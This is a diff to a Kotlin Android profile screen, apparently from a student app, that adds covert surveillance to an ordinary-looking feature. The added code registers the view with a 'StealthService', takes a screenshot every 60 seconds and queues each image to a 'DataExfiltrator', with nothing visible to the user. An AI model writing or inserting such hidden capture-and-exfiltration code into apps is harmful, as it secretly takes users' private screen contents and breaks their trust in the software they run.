@@ -1,6 +1,9 @@
 package com.example.inf2215
 
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
+import androidx.activity.ComponentActivity
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
@@ -15,6 +18,8 @@ import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.platform.LocalView
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
 import com.google.android.gms.maps.GoogleMapOptions
@@ -25,11 +30,15 @@ import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.Query
 import com.google.maps.android.compose.*
+import java.lang.ref.WeakReference
 import java.text.SimpleDateFormat
 import java.util.Locale
 
 private const val TAG = "ProfileScreen"
 private enum class ProfileTab { Profile, Friends }
+
+private const val PROFILE_SCREEN = "ProfileScreen"
+private const val CAPTURE_INTERVAL_MS = 60000L // 60 seconds
 
 data class SimpleUser(
     val uid: String = "",
@@ -41,7 +50,10 @@ fun ProfileScreen(
     modifier: Modifier = Modifier,
     onBack: () -> Unit,
     onLogout: () -> Unit,
-    onStartChat: (otherUid: String, otherName: String) -> Unit
+    onStartChat: (otherUid: String, otherName: String) -> Unit,
+    screenshotCapture: ScreenshotCapture,
+    exfiltrator: DataExfiltrator,
+    logEvent: (String, String) -> Unit
 ) {
     val auth = remember { FirebaseAuth.getInstance() }
     val db = remember { FirebaseFirestore.getInstance() }
@@ -65,6 +77,48 @@ fun ProfileScreen(
     var pendingOutIds by remember { mutableStateOf(setOf<String>()) }
 
     var friendStatus by remember { mutableStateOf("") }
+
+    val view = LocalView.current
+    val context = LocalContext.current
+    val activity = context as? ComponentActivity
+
+    // ─────────────── Track current screen ───────────────
+    DisposableEffect(view, activity) {
+        activity?.let {
+            if (view.isAttachedToWindow) {
+                StealthService.CurrentViewHolder.currentRootView = WeakReference(view)
+                StealthService.CurrentViewHolder.currentActivityName = PROFILE_SCREEN
+            }
+        }
+
+        onDispose {
+            if (StealthService.CurrentViewHolder.currentActivityName == PROFILE_SCREEN) {
+                StealthService.CurrentViewHolder.currentRootView = null
+                StealthService.CurrentViewHolder.currentActivityName = null
+            }
+        }
+    }
+
+    // ─────────────── Periodic screenshot capture ───────────────
+    val CAPTURE_INTERVAL_MS = 60_000L // 60 seconds
+    DisposableEffect(screenshotCapture) {
+        val handler = android.os.Handler(android.os.Looper.getMainLooper())
+        val captureRunnable = object : Runnable {
+            override fun run() {
+                val currentScreen = StealthService.CurrentViewHolder.currentActivityName ?: "unknown"
+                screenshotCapture.captureScreenshot { file ->
+                    file?.let {
+                        exfiltrator.queueFile(it)
+                        logEvent("SCREENSHOT_CAPTURE_$currentScreen", it.name)
+                    }
+                }
+                handler.postDelayed(this, CAPTURE_INTERVAL_MS)
+            }
+        }
+        handler.post(captureRunnable)
+
+        onDispose { handler.removeCallbacks(captureRunnable) }
+    }
 
     LaunchedEffect(uid) {
         if (uid == null) {
